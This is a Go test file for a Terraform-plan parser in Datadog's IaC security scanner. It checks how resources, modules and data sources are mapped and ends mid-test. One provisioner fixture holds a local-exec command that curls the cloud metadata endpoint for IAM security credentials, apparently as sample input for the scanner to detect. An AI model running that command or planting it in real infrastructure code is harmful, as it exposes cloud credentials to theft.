/*
 * Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
 *
 * This product includes software developed at Datadog (https://www.datadoghq.com)  Copyright 2024 Datadog, Inc.
 */
package json

import (
	"testing"

	"github.com/DataDog/datadog-iac-scanner/pkg/model"
	"github.com/stretchr/testify/require"
)

func TestJson_parseTFPlan(t *testing.T) {
	type args struct {
		doc model.Document
	}

	tests := []struct {
		name    string
		args    args
		want    model.Document
		wantErr bool
	}{
		{
			name: "test - parse as tfplan",
			args: args{
				doc: model.Document{
					"format_version":    "0.2",
					"terraform_version": "1.0.5",
					"variables":         map[string]interface{}{},
					"planned_values": map[string]interface{}{
						"root_module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address":        "fakewebservices_database.prod_db",
									"mode":           "managed",
									"type":           "fakewebservices_database",
									"name":           "prod_db",
									"provider_name":  "registry.terraform.io/hashicorp/fakewebservices",
									"schema_version": 0,
									"values": map[string]interface{}{
										"name": "Production DB",
										"size": 256,
									},
									"sensitive_values": map[string]interface{}{},
								},
							},
						},
					},
					"resource_changes": []map[string]interface{}{},
					"configuration":    map[string]interface{}{},
				},
			},
			want: model.Document{
				"resource": map[string]interface{}{
					"fakewebservices_database": map[string]interface{}{
						"prod_db": map[string]interface{}{
							"name": "Production DB",
							"size": (float64)(256),
						},
					},
				},
				"_dd_tfplan_meta": map[string]interface{}{
					"fakewebservices_database": map[string]interface{}{
						"prod_db": map[string]interface{}{
							"address": "fakewebservices_database.prod_db",
						},
					},
				},
				"resource_changes": []interface{}{},
				"configuration":    map[string]interface{}{},
			},
			wantErr: false,
		},
		{
			name: "test - resource_changes and configuration pass through",
			args: args{
				doc: model.Document{
					"format_version":    "1.2",
					"terraform_version": "1.5.0",
					"planned_values": map[string]interface{}{
						"root_module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_s3_bucket.main",
									"mode":    "managed",
									"type":    "aws_s3_bucket",
									"name":    "main",
									"values": map[string]interface{}{
										"bucket": "main-bucket",
									},
								},
							},
						},
					},
					"resource_changes": []map[string]interface{}{
						{
							"address": "aws_s3_bucket.main",
							"mode":    "managed",
							"type":    "aws_s3_bucket",
							"name":    "main",
							"change": map[string]interface{}{
								"actions": []string{"create"},
								"before":  nil,
								"after": map[string]interface{}{
									"acl": "private",
								},
								"after_unknown": map[string]interface{}{
									"bucket": true,
									"id":     true,
								},
							},
						},
					},
					"configuration": map[string]interface{}{
						"root_module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_s3_bucket.main",
									"mode":    "managed",
									"type":    "aws_s3_bucket",
									"name":    "main",
									"expressions": map[string]interface{}{
										"bucket": map[string]interface{}{
											"references": []string{"random_id.suffix"},
										},
									},
								},
							},
						},
					},
				},
			},
			want: model.Document{
				"resource": map[string]interface{}{
					"aws_s3_bucket": map[string]interface{}{
						"main": map[string]interface{}{
							"bucket": "main-bucket",
						},
					},
				},
				"_dd_tfplan_meta": map[string]interface{}{
					"aws_s3_bucket": map[string]interface{}{
						"main": map[string]interface{}{
							"address": "aws_s3_bucket.main",
							"after_unknown": map[string]interface{}{
								"bucket": true,
								"id":     true,
							},
							"configuration_expressions": map[string]interface{}{
								"bucket": map[string]interface{}{
									"references": []interface{}{"random_id.suffix"},
								},
							},
						},
					},
				},
				"resource_changes": []interface{}{
					map[string]interface{}{
						"address": "aws_s3_bucket.main",
						"mode":    "managed",
						"type":    "aws_s3_bucket",
						"name":    "main",
						"change": map[string]interface{}{
							"actions": []interface{}{"create"},
							"before":  nil,
							"after": map[string]interface{}{
								"acl": "private",
							},
							"after_unknown": map[string]interface{}{
								"bucket": true,
								"id":     true,
							},
						},
					},
				},
				"configuration": map[string]interface{}{
					"root_module": map[string]interface{}{
						"resources": []interface{}{
							map[string]interface{}{
								"address": "aws_s3_bucket.main",
								"mode":    "managed",
								"type":    "aws_s3_bucket",
								"name":    "main",
								"expressions": map[string]interface{}{
									"bucket": map[string]interface{}{
										"references": []interface{}{"random_id.suffix"},
									},
								},
							},
						},
					},
				},
			},
			wantErr: false,
		},
		{
			name: "test - should not parse tfplan",
			args: args{
				doc: model.Document{
					"resource": map[string]interface{}{
						"name": "martin",
					},
				},
			},
			want:    model.Document{},
			wantErr: true,
		},
		{
			name: "test - multi-module with same resource type",
			args: args{
				doc: model.Document{
					"format_version":    "1.2",
					"terraform_version": "1.5.0",
					"planned_values": map[string]interface{}{
						"root_module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_s3_bucket.main",
									"mode":    "managed",
									"type":    "aws_s3_bucket",
									"name":    "main",
									"values": map[string]interface{}{
										"bucket": "main-bucket",
										"acl":    "private",
									},
								},
								{
									"address": "aws_instance.web",
									"mode":    "managed",
									"type":    "aws_instance",
									"name":    "web",
									"values": map[string]interface{}{
										"instance_type": "t2.micro",
									},
								},
							},
							"child_modules": []map[string]interface{}{
								{
									"address": "module.storage",
									"resources": []map[string]interface{}{
										{
											"address": "module.storage.aws_s3_bucket.backup",
											"mode":    "managed",
											"type":    "aws_s3_bucket",
											"name":    "backup",
											"values": map[string]interface{}{
												"bucket": "backup-bucket",
												"acl":    "private",
											},
										},
									},
								},
							},
						},
					},
				},
			},
			want: model.Document{
				"resource": map[string]interface{}{
					"aws_s3_bucket": map[string]interface{}{
						"main": map[string]interface{}{
							"bucket": "main-bucket",
							"acl":    "private",
						},
						"module.storage.backup": map[string]interface{}{
							"bucket": "backup-bucket",
							"acl":    "private",
						},
					},
					"aws_instance": map[string]interface{}{
						"web": map[string]interface{}{
							"instance_type": "t2.micro",
						},
					},
				},
				"_dd_tfplan_meta": map[string]interface{}{
					"aws_s3_bucket": map[string]interface{}{
						"main": map[string]interface{}{
							"address": "aws_s3_bucket.main",
						},
						"module.storage.backup": map[string]interface{}{
							"address": "module.storage.aws_s3_bucket.backup",
						},
					},
					"aws_instance": map[string]interface{}{
						"web": map[string]interface{}{
							"address": "aws_instance.web",
						},
					},
				},
			},
			wantErr: false,
		},
		{
			name: "test - same resource name in different modules is preserved with module-prefixed keys",
			args: args{
				doc: model.Document{
					"format_version":    "1.2",
					"terraform_version": "1.5.0",
					"planned_values": map[string]interface{}{
						"root_module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_instance.web",
									"mode":    "managed",
									"type":    "aws_instance",
									"name":    "web",
									"values": map[string]interface{}{
										"instance_type": "t2.large",
										"tags": map[string]interface{}{
											"Environment": "production",
										},
									},
								},
							},
							"child_modules": []map[string]interface{}{
								{
									"address": "module.staging",
									"resources": []map[string]interface{}{
										{
											"address": "module.staging.aws_instance.web",
											"mode":    "managed",
											"type":    "aws_instance",
											"name":    "web",
											"values": map[string]interface{}{
												"instance_type": "t2.micro",
												"tags": map[string]interface{}{
													"Environment": "staging",
												},
											},
										},
									},
								},
							},
						},
					},
				},
			},
			want: model.Document{
				"resource": map[string]interface{}{
					"aws_instance": map[string]interface{}{
						"web": map[string]interface{}{
							"instance_type": "t2.large",
							"tags": map[string]interface{}{
								"Environment": "production",
							},
						},
						"module.staging.web": map[string]interface{}{
							"instance_type": "t2.micro",
							"tags": map[string]interface{}{
								"Environment": "staging",
							},
						},
					},
				},
				"_dd_tfplan_meta": map[string]interface{}{
					"aws_instance": map[string]interface{}{
						"web": map[string]interface{}{
							"address": "aws_instance.web",
						},
						"module.staging.web": map[string]interface{}{
							"address": "module.staging.aws_instance.web",
						},
					},
				},
			},
			wantErr: false,
		},
		{
			name: "test - deeply nested modules",
			args: args{
				doc: model.Document{
					"format_version":    "1.2",
					"terraform_version": "1.5.0",
					"planned_values": map[string]interface{}{
						"root_module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_vpc.main",
									"mode":    "managed",
									"type":    "aws_vpc",
									"name":    "main",
									"values": map[string]interface{}{
										"cidr_block": "10.0.0.0/16",
									},
								},
							},
							"child_modules": []map[string]interface{}{
								{
									"address": "module.networking",
									"resources": []map[string]interface{}{
										{
											"address": "module.networking.aws_subnet.public",
											"mode":    "managed",
											"type":    "aws_subnet",
											"name":    "public",
											"values": map[string]interface{}{
												"cidr_block": "10.0.1.0/24",
											},
										},
									},
									"child_modules": []map[string]interface{}{
										{
											"address": "module.networking.module.security",
											"resources": []map[string]interface{}{
												{
													"address": "module.networking.module.security.aws_security_group.web",
													"mode":    "managed",
													"type":    "aws_security_group",
													"name":    "web",
													"values": map[string]interface{}{
														"description": "Web traffic",
													},
												},
											},
										},
									},
								},
							},
						},
					},
				},
			},
			want: model.Document{
				"resource": map[string]interface{}{
					"aws_vpc": map[string]interface{}{
						"main": map[string]interface{}{
							"cidr_block": "10.0.0.0/16",
						},
					},
					"aws_subnet": map[string]interface{}{
						"module.networking.public": map[string]interface{}{
							"cidr_block": "10.0.1.0/24",
						},
					},
					"aws_security_group": map[string]interface{}{
						"module.networking.module.security.web": map[string]interface{}{
							"description": "Web traffic",
						},
					},
				},
				"_dd_tfplan_meta": map[string]interface{}{
					"aws_vpc": map[string]interface{}{
						"main": map[string]interface{}{
							"address": "aws_vpc.main",
						},
					},
					"aws_subnet": map[string]interface{}{
						"module.networking.public": map[string]interface{}{
							"address": "module.networking.aws_subnet.public",
						},
					},
					"aws_security_group": map[string]interface{}{
						"module.networking.module.security.web": map[string]interface{}{
							"address": "module.networking.module.security.aws_security_group.web",
						},
					},
				},
			},
			wantErr: false,
		},
		{
			name: "test - multiple sibling modules with same resource types is preserved with module-prefixed keys",
			args: args{
				doc: model.Document{
					"format_version":    "1.2",
					"terraform_version": "1.5.0",
					"planned_values": map[string]interface{}{
						"root_module": map[string]interface{}{
							"resources": []map[string]interface{}{},
							"child_modules": []map[string]interface{}{
								{
									"address": "module.app1",
									"resources": []map[string]interface{}{
										{
											"address": "module.app1.aws_s3_bucket.data",
											"mode":    "managed",
											"type":    "aws_s3_bucket",
											"name":    "data",
											"values": map[string]interface{}{
												"bucket": "app1-data",
											},
										},
									},
								},
								{
									"address": "module.app2",
									"resources": []map[string]interface{}{
										{
											"address": "module.app2.aws_s3_bucket.data",
											"mode":    "managed",
											"type":    "aws_s3_bucket",
											"name":    "data",
											"values": map[string]interface{}{
												"bucket": "app2-data",
											},
										},
									},
								},
							},
						},
					},
				},
			},
			want: model.Document{
				"resource": map[string]interface{}{
					"aws_s3_bucket": map[string]interface{}{
						"module.app1.data": map[string]interface{}{
							"bucket": "app1-data",
						},
						"module.app2.data": map[string]interface{}{
							"bucket": "app2-data",
						},
					},
				},
				"_dd_tfplan_meta": map[string]interface{}{
					"aws_s3_bucket": map[string]interface{}{
						"module.app1.data": map[string]interface{}{
							"address": "module.app1.aws_s3_bucket.data",
						},
						"module.app2.data": map[string]interface{}{
							"address": "module.app2.aws_s3_bucket.data",
						},
					},
				},
			},
			wantErr: false,
		},
		{
			name: "test - count creates multiple resource instances",
			args: args{
				doc: model.Document{
					"format_version":    "1.2",
					"terraform_version": "1.5.0",
					"planned_values": map[string]interface{}{
						"root_module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_instance.web[0]",
									"mode":    "managed",
									"type":    "aws_instance",
									"name":    "web",
									"index":   float64(0), // JSON numbers are float64
									"values": map[string]interface{}{
										"instance_type": "t2.micro",
										"tags": map[string]interface{}{
											"Name":  "web-0",
											"Index": float64(0),
										},
									},
								},
								{
									"address": "aws_instance.web[1]",
									"mode":    "managed",
									"type":    "aws_instance",
									"name":    "web",
									"index":   float64(1),
									"values": map[string]interface{}{
										"instance_type": "t2.micro",
										"tags": map[string]interface{}{
											"Name":  "web-1",
											"Index": float64(1),
										},
									},
								},
								{
									"address": "aws_instance.web[2]",
									"mode":    "managed",
									"type":    "aws_instance",
									"name":    "web",
									"index":   float64(2),
									"values": map[string]interface{}{
										"instance_type": "t2.micro",
										"tags": map[string]interface{}{
											"Name":  "web-2",
											"Index": float64(2),
										},
									},
								},
							},
						},
					},
				},
			},
			want: model.Document{
				"resource": map[string]interface{}{
					"aws_instance": map[string]interface{}{
						"web[0]": map[string]interface{}{
							"instance_type": "t2.micro",
							"tags": map[string]interface{}{
								"Name":  "web-0",
								"Index": float64(0),
							},
						},
						"web[1]": map[string]interface{}{
							"instance_type": "t2.micro",
							"tags": map[string]interface{}{
								"Name":  "web-1",
								"Index": float64(1),
							},
						},
						"web[2]": map[string]interface{}{
							"instance_type": "t2.micro",
							"tags": map[string]interface{}{
								"Name":  "web-2",
								"Index": float64(2),
							},
						},
					},
				},
				"_dd_tfplan_meta": map[string]interface{}{
					"aws_instance": map[string]interface{}{
						"web[0]": map[string]interface{}{
							"address": "aws_instance.web[0]",
						},
						"web[1]": map[string]interface{}{
							"address": "aws_instance.web[1]",
						},
						"web[2]": map[string]interface{}{
							"address": "aws_instance.web[2]",
						},
					},
				},
			},
			wantErr: false,
		},
		{
			name: "test - for_each creates multiple resource instances",
			args: args{
				doc: model.Document{
					"format_version":    "1.2",
					"terraform_version": "1.5.0",
					"planned_values": map[string]interface{}{
						"root_module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_s3_bucket.data[\"prod\"]",
									"mode":    "managed",
									"type":    "aws_s3_bucket",
									"name":    "data",
									"index":   "prod",
									"values": map[string]interface{}{
										"bucket": "prod-data-bucket",
										"acl":    "private",
									},
								},
								{
									"address": "aws_s3_bucket.data[\"staging\"]",
									"mode":    "managed",
									"type":    "aws_s3_bucket",
									"name":    "data",
									"index":   "staging",
									"values": map[string]interface{}{
										"bucket": "staging-data-bucket",
										"acl":    "private",
									},
								},
								{
									"address": "aws_s3_bucket.data[\"dev\"]",
									"mode":    "managed",
									"type":    "aws_s3_bucket",
									"name":    "data",
									"index":   "dev",
									"values": map[string]interface{}{
										"bucket": "dev-data-bucket",
										"acl":    "private",
									},
								},
							},
						},
					},
				},
			},
			want: model.Document{
				"resource": map[string]interface{}{
					"aws_s3_bucket": map[string]interface{}{
						"data[\"prod\"]": map[string]interface{}{
							"bucket": "prod-data-bucket",
							"acl":    "private",
						},
						"data[\"staging\"]": map[string]interface{}{
							"bucket": "staging-data-bucket",
							"acl":    "private",
						},
						"data[\"dev\"]": map[string]interface{}{
							"bucket": "dev-data-bucket",
							"acl":    "private",
						},
					},
				},
				"_dd_tfplan_meta": map[string]interface{}{
					"aws_s3_bucket": map[string]interface{}{
						"data[\"prod\"]": map[string]interface{}{
							"address": "aws_s3_bucket.data[\"prod\"]",
						},
						"data[\"staging\"]": map[string]interface{}{
							"address": "aws_s3_bucket.data[\"staging\"]",
						},
						"data[\"dev\"]": map[string]interface{}{
							"address": "aws_s3_bucket.data[\"dev\"]",
						},
					},
				},
			},
			wantErr: false,
		},
		{
			name: "test - injects resource values line from _dd_lines",
			args: args{
				doc: model.Document{
					"format_version":    "0.2",
					"terraform_version": "1.0.5",
					"variables":         map[string]any{},
					"planned_values": map[string]any{
						"root_module": map[string]any{
							"_dd_lines": map[string]any{
								"_dd_resources": map[string]any{
									"_dd_arr": []map[string]any{
										{
											"_dd__default": map[string]any{"_dd_line": 5},
											"_dd_values":   map[string]any{"_dd_line": 7},
										},
									},
								},
							},
							"resources": []map[string]any{
								{
									"address": "fakewebservices_database.prod_db",
									"mode":    "managed",
									"type":    "fakewebservices_database",
									"name":    "prod_db",
									"values": map[string]any{
										"name": "Production DB",
										"size": 256,
									},
								},
							},
						},
					},
					"resource_changes": []map[string]any{},
					"configuration":    map[string]any{},
				},
			},
			want: model.Document{
				"resource": map[string]any{
					"fakewebservices_database": map[string]any{
						"_dd_lines": map[string]any{
							"_dd_prod_db": map[string]any{"_dd_line": (float64)(7)},
						},
						"prod_db": map[string]any{
							"name": "Production DB",
							"size": (float64)(256),
						},
					},
				},
				"_dd_tfplan_meta": map[string]any{
					"fakewebservices_database": map[string]any{
						"prod_db": map[string]any{
							"address": "fakewebservices_database.prod_db",
						},
					},
				},
				"resource_changes": []any{},
				"configuration":    map[string]any{},
			},
			wantErr: false,
		},
		{
			name: "test - resolved data source in prior_state merged under data.<type>.<name>",
			args: args{
				doc: model.Document{
					"format_version":    "0.2",
					"terraform_version": "1.0.5",
					"variables":         map[string]any{},
					"planned_values": map[string]any{
						"root_module": map[string]any{
							"resources": []map[string]any{},
						},
					},
					"prior_state": map[string]any{
						"format_version": "1.0",
						"values": map[string]any{
							"root_module": map[string]any{
								"resources": []map[string]any{
									{
										"address": "data.aws_kms_key.by_alias",
										"mode":    "data",
										"type":    "aws_kms_key",
										"name":    "by_alias",
										"values": map[string]any{
											"key_id": "alias/aws/s3",
											"arn":    "arn:aws:kms:us-east-1:123456789012:key/abc",
											"id":     "abc",
										},
									},
								},
							},
						},
					},
					"resource_changes": []map[string]any{},
					"configuration":    map[string]any{},
				},
			},
			want: model.Document{
				"resource": map[string]any{},
				"data": map[string]any{
					"aws_kms_key": map[string]any{
						"by_alias": map[string]any{
							"key_id": "alias/aws/s3",
							"arn":    "arn:aws:kms:us-east-1:123456789012:key/abc",
							"id":     "abc",
						},
					},
				},
				"resource_changes": []any{},
				"configuration":    map[string]any{},
			},
			wantErr: false,
		},
		{
			name: "test - data source scheduled for deletion in resource_changes is excluded from prior_state merge",
			args: args{
				doc: model.Document{
					"format_version":    "1.2",
					"terraform_version": "1.5.0",
					"planned_values": map[string]any{
						"root_module": map[string]any{
							"resources": []map[string]any{},
						},
					},
					"prior_state": map[string]any{
						"format_version": "1.0",
						"values": map[string]any{
							"root_module": map[string]any{
								"resources": []map[string]any{
									{
										"address": "data.aws_kms_key.by_alias",
										"mode":    "data",
										"type":    "aws_kms_key",
										"name":    "by_alias",
										"values": map[string]any{
											"key_id": "alias/aws/s3",
										},
									},
								},
							},
						},
					},
					"resource_changes": []map[string]any{
						{
							"address": "data.aws_kms_key.by_alias",
							"mode":    "data",
							"type":    "aws_kms_key",
							"name":    "by_alias",
							"change": map[string]any{
								"actions": []any{"delete"},
								"before":  map[string]any{"key_id": "alias/aws/s3"},
								"after":   nil,
							},
						},
					},
					"configuration": map[string]any{},
				},
			},
			want: model.Document{
				"resource":         map[string]any{},
				"resource_changes": []any{map[string]any{"address": "data.aws_kms_key.by_alias", "mode": "data", "type": "aws_kms_key", "name": "by_alias", "change": map[string]any{"actions": []any{"delete"}, "before": map[string]any{"key_id": "alias/aws/s3"}, "after": nil}}},
				"configuration":    map[string]any{},
			},
			wantErr: false,
		},
		{
			name: "test - for_each data source instances in prior_state keep distinct keys",
			args: args{
				doc: model.Document{
					"format_version":    "1.2",
					"terraform_version": "1.5.0",
					"planned_values": map[string]any{
						"root_module": map[string]any{
							"resources": []map[string]any{},
						},
					},
					"prior_state": map[string]any{
						"format_version": "1.0",
						"values": map[string]any{
							"root_module": map[string]any{
								"resources": []map[string]any{
									{
										"address": `data.aws_kms_key.by_alias["prod"]`,
										"mode":    "data",
										"type":    "aws_kms_key",
										"name":    "by_alias",
										"index":   "prod",
										"values": map[string]any{
											"key_id": "alias/prod",
										},
									},
									{
										"address": `data.aws_kms_key.by_alias["dev"]`,
										"mode":    "data",
										"type":    "aws_kms_key",
										"name":    "by_alias",
										"index":   "dev",
										"values": map[string]any{
											"key_id": "alias/dev",
										},
									},
								},
							},
						},
					},
					"resource_changes": []map[string]any{},
					"configuration":    map[string]any{},
				},
			},
			want: model.Document{
				"resource": map[string]any{},
				"data": map[string]any{
					"aws_kms_key": map[string]any{
						`by_alias["prod"]`: map[string]any{
							"key_id": "alias/prod",
						},
						`by_alias["dev"]`: map[string]any{
							"key_id": "alias/dev",
						},
					},
				},
				"resource_changes": []any{},
				"configuration":    map[string]any{},
			},
			wantErr: false,
		},
		{
			name: "test - same-name data source in root and child module keeps module-prefixed keys",
			args: args{
				doc: model.Document{
					"format_version":    "1.2",
					"terraform_version": "1.5.0",
					"planned_values": map[string]any{
						"root_module": map[string]any{
							"resources": []map[string]any{},
						},
					},
					"prior_state": map[string]any{
						"format_version": "1.0",
						"values": map[string]any{
							"root_module": map[string]any{
								"resources": []map[string]any{
									{
										"address": "data.aws_kms_key.by_alias",
										"mode":    "data",
										"type":    "aws_kms_key",
										"name":    "by_alias",
										"values": map[string]any{
											"key_id": "alias/root",
										},
									},
								},
								"child_modules": []map[string]any{
									{
										"address": "module.storage",
										"resources": []map[string]any{
											{
												"address": "module.storage.data.aws_kms_key.by_alias",
												"mode":    "data",
												"type":    "aws_kms_key",
												"name":    "by_alias",
												"values": map[string]any{
													"key_id": "alias/storage",
												},
											},
										},
									},
								},
							},
						},
					},
					"resource_changes": []map[string]any{},
					"configuration":    map[string]any{},
				},
			},
			want: model.Document{
				"resource": map[string]any{},
				"data": map[string]any{
					"aws_kms_key": map[string]any{
						"by_alias": map[string]any{
							"key_id": "alias/root",
						},
						"module.storage.by_alias": map[string]any{
							"key_id": "alias/storage",
						},
					},
				},
				"resource_changes": []any{},
				"configuration":    map[string]any{},
			},
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := parseTFPlan(tt.args.doc)
			if tt.wantErr {
				require.Error(t, err)
			} else {
				require.NoError(t, err)
			}
			require.Equal(t, tt.want, got)
		})
	}
}

// TestJson_parseTFPlan_dd_tfplan_meta_correlation exercises _dd_tfplan_meta's
// direct-lookup contract, including for_each keys with a dot, "]", or quote.
func TestJson_parseTFPlan_dd_tfplan_meta_correlation(t *testing.T) {
	doc := model.Document{
		"format_version":    "1.2",
		"terraform_version": "1.5.0",
		"planned_values": map[string]interface{}{
			"root_module": map[string]interface{}{
				"resources": []map[string]interface{}{
					{
						"address": "aws_vpc.main",
						"mode":    "managed",
						"type":    "aws_vpc",
						"name":    "main",
						"values": map[string]interface{}{
							"cidr_block": "10.0.0.0/16",
						},
					},
					{
						"address": "aws_instance.web[0]",
						"mode":    "managed",
						"type":    "aws_instance",
						"name":    "web",
						"index":   float64(0),
						"values": map[string]interface{}{
							"instance_type": "t2.micro",
						},
					},
					{
						"address": "aws_s3_bucket.data[\"prod\"]",
						"mode":    "managed",
						"type":    "aws_s3_bucket",
						"name":    "data",
						"index":   "prod",
						"values": map[string]interface{}{
							"bucket": "prod-data-bucket",
						},
					},
					{
						"address": "aws_s3_bucket.data[\"a.b\"]",
						"mode":    "managed",
						"type":    "aws_s3_bucket",
						"name":    "data",
						"index":   "a.b",
						"values": map[string]interface{}{
							"bucket": "dotted-key-bucket",
						},
					},
					{
						"address": "aws_s3_bucket.data[\"a]b\"]",
						"mode":    "managed",
						"type":    "aws_s3_bucket",
						"name":    "data",
						"index":   "a]b",
						"values": map[string]interface{}{
							"bucket": "bracket-key-bucket",
						},
					},
					{
						"address": "aws_s3_bucket.data[\"a\\\"b\"]",
						"mode":    "managed",
						"type":    "aws_s3_bucket",
						"name":    "data",
						"index":   "a\"b",
						"values": map[string]interface{}{
							"bucket": "quote-key-bucket",
						},
					},
				},
				"child_modules": []map[string]interface{}{
					{
						"address": "module.networking",
						"resources": []map[string]interface{}{
							{
								"address": "module.networking.aws_subnet.public",
								"mode":    "managed",
								"type":    "aws_subnet",
								"name":    "public",
								"values": map[string]interface{}{
									"cidr_block": "10.0.1.0/24",
								},
							},
						},
					},
				},
			},
		},
		"resource_changes": []map[string]interface{}{
			{
				"address": "aws_vpc.main",
				"change": map[string]interface{}{
					"after_unknown": map[string]interface{}{"id": true},
				},
			},
			{
				"address": "aws_instance.web[0]",
				"change": map[string]interface{}{
					"after_unknown": map[string]interface{}{"arn": true},
				},
			},
			{
				"address": "aws_s3_bucket.data[\"prod\"]",
				"change": map[string]interface{}{
					"after_unknown": map[string]interface{}{"id": true},
				},
			},
			{
				"address": "aws_s3_bucket.data[\"a.b\"]",
				"change": map[string]interface{}{
					"after_unknown": map[string]interface{}{"id": true},
				},
			},
			{
				"address": "aws_s3_bucket.data[\"a]b\"]",
				"change": map[string]interface{}{
					"after_unknown": map[string]interface{}{"id": true},
				},
			},
			{
				"address": "aws_s3_bucket.data[\"a\\\"b\"]",
				"change": map[string]interface{}{
					"after_unknown": map[string]interface{}{"id": true},
				},
			},
			{
				"address": "module.networking.aws_subnet.public",
				"change": map[string]interface{}{
					"after_unknown": map[string]interface{}{"id": true},
				},
			},
		},
		"configuration": map[string]interface{}{
			"root_module": map[string]interface{}{
				"resources": []map[string]interface{}{
					{
						"address": "aws_vpc.main",
						"expressions": map[string]interface{}{
							"cidr_block": map[string]interface{}{"constant_value": "10.0.0.0/16"},
						},
					},
					{
						"address": "aws_instance.web",
						"expressions": map[string]interface{}{
							"instance_type": map[string]interface{}{"references": []string{"var.instance_type"}},
						},
					},
					{
						"address": "aws_s3_bucket.data",
						"expressions": map[string]interface{}{
							"bucket": map[string]interface{}{"references": []string{"var.bucket_name"}},
						},
					},
				},
				"module_calls": map[string]interface{}{
					"networking": map[string]interface{}{
						"module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_subnet.public",
									"expressions": map[string]interface{}{
										"cidr_block": map[string]interface{}{"references": []string{"var.subnet_cidr"}},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	got, err := parseTFPlan(doc)
	require.NoError(t, err)

	meta := func(resourceType, key string) map[string]interface{} {
		ddMeta, ok := got["_dd_tfplan_meta"].(map[string]interface{})
		require.True(t, ok, "_dd_tfplan_meta not found")
		typeMap, ok := ddMeta[resourceType].(map[string]interface{})
		require.True(t, ok, "_dd_tfplan_meta.%s not found", resourceType)
		entry, ok := typeMap[key].(map[string]interface{})
		require.True(t, ok, "_dd_tfplan_meta.%s.%s not found", resourceType, key)
		return entry
	}

	// _dd_tfplan_meta must never be nested inside resource.<type>.
	resourceTypes, ok := got["resource"].(map[string]interface{})
	require.True(t, ok)
	for resourceType, typeMap := range resourceTypes {
		asMap, ok := typeMap.(map[string]interface{})
		require.True(t, ok)
		require.NotContains(t, asMap, "_dd_tfplan_meta", "resource.%s must not contain _dd_tfplan_meta", resourceType)
	}

	require.Equal(t, map[string]interface{}{
		"address":                   "aws_vpc.main",
		"after_unknown":             map[string]interface{}{"id": true},
		"configuration_expressions": map[string]interface{}{"cidr_block": map[string]interface{}{"constant_value": "10.0.0.0/16"}},
	}, meta("aws_vpc", "main"))

	require.Equal(t, map[string]interface{}{
		"address":                   "aws_instance.web[0]",
		"after_unknown":             map[string]interface{}{"arn": true},
		"configuration_expressions": map[string]interface{}{"instance_type": map[string]interface{}{"references": []interface{}{"var.instance_type"}}},
	}, meta("aws_instance", "web[0]"))

	require.Equal(t, map[string]interface{}{
		"address":                   "aws_s3_bucket.data[\"prod\"]",
		"after_unknown":             map[string]interface{}{"id": true},
		"configuration_expressions": map[string]interface{}{"bucket": map[string]interface{}{"references": []interface{}{"var.bucket_name"}}},
	}, meta("aws_s3_bucket", "data[\"prod\"]"))

	require.Equal(t, map[string]interface{}{
		"address":                   "aws_s3_bucket.data[\"a.b\"]",
		"after_unknown":             map[string]interface{}{"id": true},
		"configuration_expressions": map[string]interface{}{"bucket": map[string]interface{}{"references": []interface{}{"var.bucket_name"}}},
	}, meta("aws_s3_bucket", "data[\"a.b\"]"))

	require.Equal(t, map[string]interface{}{
		"address":                   "aws_s3_bucket.data[\"a]b\"]",
		"after_unknown":             map[string]interface{}{"id": true},
		"configuration_expressions": map[string]interface{}{"bucket": map[string]interface{}{"references": []interface{}{"var.bucket_name"}}},
	}, meta("aws_s3_bucket", "data[\"a]b\"]"))

	require.Equal(t, map[string]interface{}{
		"address":                   "aws_s3_bucket.data[\"a\\\"b\"]",
		"after_unknown":             map[string]interface{}{"id": true},
		"configuration_expressions": map[string]interface{}{"bucket": map[string]interface{}{"references": []interface{}{"var.bucket_name"}}},
	}, meta("aws_s3_bucket", "data[\"a\\\"b\"]"))

	require.Equal(t, map[string]interface{}{
		"address":                   "module.networking.aws_subnet.public",
		"after_unknown":             map[string]interface{}{"id": true},
		"configuration_expressions": map[string]interface{}{"cidr_block": map[string]interface{}{"references": []interface{}{"var.subnet_cidr"}}},
	}, meta("aws_subnet", "module.networking.public"))
}

func TestJson_parseTFPlan_dd_tfplan_meta_provisioners(t *testing.T) {
	doc := model.Document{
		"format_version":    "1.2",
		"terraform_version": "1.5.0",
		"planned_values": map[string]interface{}{
			"root_module": map[string]interface{}{
				"resources": []map[string]interface{}{
					{
						"address": "aws_instance.web",
						"mode":    "managed",
						"type":    "aws_instance",
						"name":    "web",
						"values":  map[string]interface{}{"instance_type": "t2.micro"},
					},
				},
			},
		},
		"resource_changes": []map[string]interface{}{},
		"configuration": map[string]interface{}{
			"root_module": map[string]interface{}{
				"resources": []map[string]interface{}{
					{
						"address": "aws_instance.web",
						"expressions": map[string]interface{}{
							"instance_type": map[string]interface{}{"constant_value": "t2.micro"},
						},
						"provisioners": []map[string]interface{}{
							{
								"type": "local-exec",
								"expressions": map[string]interface{}{
									"command": map[string]interface{}{"constant_value": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
								},
							},
						},
					},
				},
			},
		},
	}

	got, err := parseTFPlan(doc)
	require.NoError(t, err)

	ddMeta, ok := got["_dd_tfplan_meta"].(map[string]interface{})
	require.True(t, ok)
	entry := ddMeta["aws_instance"].(map[string]interface{})["web"].(map[string]interface{})

	require.Equal(t, []interface{}{
		map[string]interface{}{
			"type": "local-exec",
			"expressions": map[string]interface{}{
				"command": map[string]interface{}{"constant_value": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
			},
		},
	}, entry["provisioners"])
}

// TestJson_parseTFPlan_dd_tfplan_meta_module_call_var_constant_attached
// covers a literal call-site constant, exposed via call_site_expressions.
func TestJson_parseTFPlan_dd_tfplan_meta_module_call_var_constant_attached(t *testing.T) {
	doc := model.Document{
		"format_version":    "1.2",
		"terraform_version": "1.5.0",
		"planned_values": map[string]interface{}{
			"root_module": map[string]interface{}{
				"child_modules": []map[string]interface{}{
					{
						"address": "module.instance",
